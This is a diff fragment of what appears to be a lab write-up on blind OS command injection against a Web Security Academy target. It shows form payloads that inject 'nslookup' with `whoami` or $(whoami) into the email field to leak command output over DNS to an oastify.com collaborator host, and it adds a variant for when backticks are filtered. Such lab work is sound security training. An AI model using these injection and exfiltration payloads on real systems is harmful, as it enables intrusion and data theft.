@@ -70,3 +70,5 @@ Host: 0a43003d049f1fae8036305a00f6003f.web-security-academy.net
 
 name=xyzzz&email=test%40t.com+%26+nslookup+`whoami`.xxxx.oastify.com+%23&subject=ss&message=sw
 ```
+We could also exfilterate the data using $ if backtick is blocked. Below is the payload.<br>
+**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup $(whoami).xxxx.oastify.com #
